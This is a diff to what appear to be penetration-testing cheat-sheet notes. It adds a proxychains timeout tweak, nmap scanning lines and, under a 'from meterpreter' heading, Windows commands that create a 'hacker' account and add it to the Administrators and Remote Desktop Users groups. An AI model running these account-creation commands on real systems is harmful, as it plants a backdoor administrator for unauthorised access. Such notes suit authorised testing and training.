@@ -2,6 +2,14 @@
  Ping Sweep
    for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &); done   (must be in bash shell)
    
+  Speed up proxychains:
+   sudo vim /etc/proxychains.conf
+   tcp_read_time_out  800
+   tcp_connect_time_out 600   
+   
+   
+   
+   
 NMAP Scripting Engine:
        nmap -Pn -T4 --min-rate 2435434 <IP> -p-
        /usr/share/nmap/scripts
@@ -72,19 +80,14 @@ NMAP Scripting Engine:
    
    
    
+ 
+   from meterpreter, to make an admin user
+   net user hacker password /add
+   net localgroup administrators hacker /add
+   net localgroup "remote desktop users" hacker /add
    
    
    
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
+ schtasks /query  
+ auditpol /get /category:*
+ 
